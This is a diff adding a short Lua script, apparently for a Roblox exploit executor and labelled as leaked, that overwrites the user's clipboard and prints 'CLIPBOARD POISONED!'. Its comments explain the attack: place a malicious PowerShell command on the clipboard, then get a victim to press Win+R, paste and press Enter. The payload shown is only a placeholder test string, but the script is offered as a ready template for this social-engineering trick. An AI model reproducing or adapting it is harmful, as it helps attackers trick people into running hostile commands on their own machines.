@@ -1,0 +1,8 @@
+--leaked by skyr0
+--on line 4 put what you want to put as clipboard
+-- this can be abused by telling the victim to click win + r and ctrl v and enter
+--you can put a malicious powershell command!
+if setclipboard then
+    setclipboard("Seliware test")
+    print("📋 CLIPBOARD POISONED!")
+end
